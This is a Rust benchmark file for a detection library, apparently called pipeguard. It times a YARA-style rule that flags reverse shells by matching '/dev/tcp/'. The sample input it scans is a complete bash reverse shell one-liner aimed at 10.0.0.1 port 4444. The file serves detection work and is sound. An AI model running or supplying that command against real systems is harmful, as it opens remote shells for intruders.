use criterion::{black_box, criterion_group, criterion_main, Criterion};
use pipeguard::detection::pipeline::{DetectionPipeline, PipelineConfig};

const TEST_RULE: &str = r#"
rule test_reverse_shell {
    meta:
        severity = 9
        description = "Detects reverse shell patterns"
    strings:
        $devtcp = "/dev/tcp/" nocase
    condition:
        any of them
}
"#;

fn end_to_end_latency(c: &mut Criterion) {
    c.bench_function("pipeline_create_and_scan", |b| {
        b.iter(|| {
            let pipeline =
                DetectionPipeline::new(black_box(TEST_RULE), PipelineConfig::default()).unwrap();
            pipeline.analyze(black_box("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"))
        })
    });

    let pipeline = DetectionPipeline::new(TEST_RULE, PipelineConfig::default()).unwrap();
    c.bench_function("scan_only_latency", |b| {
        b.iter(|| pipeline.analyze(black_box("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")))
    });
}

criterion_group!(benches, end_to_end_latency);
criterion_main!(benches);
